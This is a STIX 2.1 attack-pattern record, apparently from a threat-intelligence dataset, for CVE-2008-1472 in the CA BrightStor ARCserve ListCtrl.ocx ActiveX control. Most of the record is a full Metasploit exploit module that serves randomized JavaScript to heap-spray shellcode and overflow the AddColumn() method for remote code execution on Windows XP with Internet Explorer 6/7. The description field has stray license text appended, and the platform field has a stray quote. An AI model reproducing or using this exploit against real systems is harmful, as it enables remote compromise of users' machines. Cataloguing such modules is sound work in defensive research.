{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6156bed7-3352-4cfb-89c5-02579c238680",
    "created": "2024-08-14T16:40:14.763595Z",
    "modified": "2024-08-14T16:40:14.763599Z",
    "name": "CA BrightStor ARCserve Backup AddColumn() ActiveX Buffer Overflow",
    "description": " The CA BrightStor ARCserve Backup ActiveX control (ListCtrl.ocx) is vulnerable to a stack-based buffer overflow. By passing an overly long argument to the AddColumn() method, a remote attacker could overflow a buffer and execute arbitrary code on the system.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/ca_brightstor_addcolumn.rb",
            "external_id": "ca_brightstor_addcolumn.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2008-1472"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'CA BrightStor ARCserve Backup AddColumn() ActiveX Buffer Overflow',\n      'Description'    => %q{\n          The CA BrightStor ARCserve Backup ActiveX control (ListCtrl.ocx) is vulnerable to a stack-based\n        buffer overflow. By passing an overly long argument to the AddColumn() method, a remote attacker\n        could overflow a buffer and execute arbitrary code on the system.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [ 'dean <dean[at]zerodaysolutions.com>' ],\n      'References'     =>\n        [\n          [ 'CVE', '2008-1472' ],\n          [ 'OSVDB', '43214' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'         => 1024,\n          'BadChars'      => \"\\x00\",\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows XP SP2-SP3 IE 6.0/7.0', { 'Ret' => 0x0A0A0A0A } ]\n        ],\n      'DisclosureDate' => '2008-03-16',\n      'DefaultTarget'  => 0))\n  end\n\n  def autofilter\n    false\n  end\n\n  def check_dependencies\n    use_zlib\n  end\n\n  def on_request_uri(cli, request)\n    # Re-generate the payload.\n    return if ((p = regenerate_payload(cli)) == nil)\n\n    # Encode the shellcode.\n    shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))\n\n    # Create some nops.\n    nops    = Rex::Text.to_unescape(make_nops(4))\n\n    # Set the return.\n    ret     = Rex::Text.to_unescape([target.ret].pack('V'))\n\n    # Randomize the javascript variable names.\n    vname  = rand_text_alpha(rand(30) + 1)\n    var_i  = rand_text_alpha(rand(5) + 1)\n    rand1  = rand_text_alpha(rand(100) + 1)\n    rand2  = rand_text_alpha(rand(100) + 1)\n    rand3  = rand_text_alpha(rand(100) + 1)\n    rand4  = rand_text_alpha(rand(100) + 1)\n    rand5  = rand_text_alpha(rand(100) + 1)\n    rand6  = rand_text_alpha(rand(100) + 1)\n    rand7  = rand_text_alpha(rand(100) + 1)\n\n    content = %Q|\n    <html>\n    <object id=\"#{vname}\" classid=\"clsid:BF6EFFF3-4558-4C4C-ADAF-A87891C5F3A3\"></object>\n      <script>\n\n      var #{rand1} = unescape(\"#{shellcode}\");\n      var #{rand2} = 0x0A0A0A0A;\n      var #{rand3} = 0x400000;\n      var #{rand4} = (#{rand2} - #{rand3}) / #{rand3};\n      var #{rand5} = unescape(\"#{ret}\");\n      var #{rand6} = 128;\n\n      while((#{rand5}.length * 2) < #{rand3}) #{rand5} += #{rand5};\n        #{rand5} = #{rand5}.substring(0, #{rand3} - #{rand1}.length);\n        #{rand7} = new Array();\n        for(#{var_i} = 0; #{var_i} < #{rand4}; #{var_i}++) #{rand7}[#{var_i}] = #{rand5} + #{rand1};\n          while(#{rand5}.length < (#{rand6} * 2)) #{rand5} += #{rand5};\n            #{rand5} = #{rand5}.substring(0, #{rand6});\n\n            #{vname}.AddColumn(#{rand5}, 1);\n      </script>\n    </html>\n      |\n\n    content = Rex::Text.randomize_space(content)\n\n    print_status(\"Sending #{self.name}\")\n\n    # Transmit the response to the client\n    send_response_html(cli, content)\n\n    # Handle the payload\n    handler(cli)\n  end\nend\n",
    "x_mitre_disclosure_date": "2008-03-16",
    "x_mitre_platforms": [
        "win'"
    ]
}